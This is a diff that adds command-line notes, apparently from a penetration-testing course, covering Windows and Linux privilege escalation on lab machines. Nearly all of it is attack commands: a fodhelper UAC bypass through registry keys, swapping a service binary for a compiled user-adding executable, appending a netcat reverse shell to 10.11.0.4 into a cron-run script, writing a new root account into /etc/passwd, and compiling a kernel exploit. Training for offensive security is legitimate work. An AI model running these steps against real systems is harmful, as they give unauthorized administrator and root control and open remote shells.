@@ -97,6 +97,15 @@ DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
 student@debian:~$ lsmod
 student@debian:~$ /sbin/modinfo libata
 
+c:\Users\student>reg query
+HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+
+c:\Users\student>reg query
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+
+student@debian:~$ find / -perm -u=s -type f 2>/dev/null
+
+
 
 
 
@@ -111,5 +120,155 @@ c:\Users\student>reg query
 HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
 
 student@debian:~$ find / -perm -u=s -type f 2>/dev/null
+
+
+
+
+Automated Enumeration 
+c:\Tools\privilege_escalation\windows-privesc-check-master>windows-privesc-check2.exe -h
+
+c:\Tools\privilege_escalation\windows-privesc-check-master>windows-privesc-check2.exe --dump -G
+student@debian:~$./unix-privesc-check
+student@debian:~$ ./unix-privesc-check standard > output.txt
+
+
+
+
+
+
+Introduction to User Account Control (UAC)
+c:\Users\admin>whoami /groups
+C:\Users\admin> net user admin Ev!lpass
+C:\Users\admin>powershell.exe Start-Process cmd.exe -Verb runAs
+C:\Windows\system32> whoami /groups
+C:\Windows\system32> net user admin Ev!lpass
+
+
+
+
+
+
+User Account Control (UAC) Bypass: fodhelper.exe Case Study
+C:\> cd C:\Tools\privilege_escalation\SysinternalsSuite
+C:\Tools\privilege_escalation\SysinternalsSuite> sigcheck.exe -a -m
+C:\Windows\System32\fodhelper.exe
+C:\Users\admin> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
+
+C:\Users\admin> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v
+DelegateExecute /t REG_SZ
+
+C:\Users\admin> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d
+"cmd.exe" /f
+
+C:\Windows\system32> net user admin Ev!lpass
+
+
+
+
+
+
+
+Insecure File Permissions: Serviio Case Study
+PS C:\Users\student> Get-WmiObject win32_service | Select-Object Name, State, PathName
+| Where-Object {$_.State -like 'Running'}
+
+C:\Users\student> icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
+
+kali@kali:~$i686-w64-mingw32-gcc adduser.c -o adduser.exe
+
+C:\Users\student> move "C:\Program Files\Serviio\bin\ServiioService.exe" "C:\Program
+Files\Serviio\bin\ServiioService_original.exe"
+
+1 file(s) moved.
+C:\Users\student> move adduser.exe "C:\Program Files\Serviio\bin\ServiioService.exe"
+
+1 file(s) moved.
+C:\Users\student> dir "C:\Program Files\Serviio\bin\"
+
+C:\Users\student> net stop Serviio
+
+C:\Users\student>wmic service where caption="Serviio" get name, caption, state,
+startmode
+
+C:\Users\student>whoami /priv
+
+C:\Users\student\Desktop> shutdown /r /t 0
+
+C:\Users\evil> net localgroup Administrators
+
+
+
+
+
+
+
+Windows Kernel Vulnerabilities: USBPcap Case Study
+C:\> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+C:\Users\student\Desktop>driverquery /v
+kali@kali:~# searchsploit USBPcap
+C:\Users\n00b> cd "C:\Program Files"
+C:\Program Files> dir
+C:\Program Files\USBPcap> type USBPcap.inf
+
+
+
+
+
+Compiling C/C++ Code on Windows 
+C:\Program Files\mingw-w64\i686-7.2.0-posix-dwarf-rt_v5-rev1> mingw-w64.bat
+C:\> gcc
+C:\> gcc --help
+
+
+
+
+
+
+Insecure File Permissions: Cron Case Study 
+student@debian:~$ grep "CRON" /var/log/cron.log
+student@debian:~$ cat /var/scripts/user_backups.sh
+student@debian:~$ ls -lah /var/scripts/user_backups.sh
+
+student@debian:/var/scripts$ echo >> user_backups.sh
+
+student@debian:/var/scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i
+2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh
+
+student@debian:/var/scripts$ cat user_backups.sh
+
+kali@kali:~$ nc -lnvp 1234
+# whoami
+
+
+
+
+
+
+Insecure File Permissions: /etc/passwd Case Study
+student@debian:~$ openssl passwd evil
+student@debian:~$ echo "root2:AK24fcSx2Il3I:0:0:root:/root:/bin/bash" >> /etc/passwd
+student@debian:~$ su root2
+Password: evil
+root@debian:/home/student# id
+
+
+
+
+
+
+Kernel Vulnerabilities: CVE-2017-1000112 Case Study
+n00b@victim:~$ cat /etc/issue
+n00b@victim:~$ uname -r
+kali@kali:~$ searchsploit linux kernel ubuntu 16.04
+
+
+
+
+
+Compiling C/C++ Code on Linux
+n00b@victim:~$ gcc 43418.c -o exploit
+n00b@victim:~$ ls -lah exploit
+
+
 
 
